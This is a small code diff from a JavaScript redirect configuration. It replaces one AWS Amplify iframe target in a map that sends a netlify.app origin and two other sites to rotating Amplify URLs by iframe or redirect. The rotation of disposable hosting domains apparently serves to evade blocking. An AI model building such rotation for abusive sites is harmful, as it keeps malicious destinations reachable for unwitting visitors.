@@ -109,7 +109,7 @@ async function getRotationTarget(key) {
 //                    embed it in an iframe (target is ignored)
 const ORIGIN_GROUPS = {
   rocky: {
-    "https://timely-platypus-b9b75e.netlify.app": { method: "iframe", target: "https://main.d2jcbd5bhdzuwz.amplifyapp.com" },
+    "https://timely-platypus-b9b75e.netlify.app": { method: "iframe", target: "https://main.d2zy8k8975ebyy.amplifyapp.com" },
     "https://hiroakitravels.com": { method: "redirect", target: AMPLIFY_URL_FALLBACK, redisKey: KEY_AMPLIFY_URL },
     "https://teruogames.org": { method: "redirect", target: AMPLIFY_URL_FALLBACK, redisKey: KEY_AMPLIFY_URL },
   },
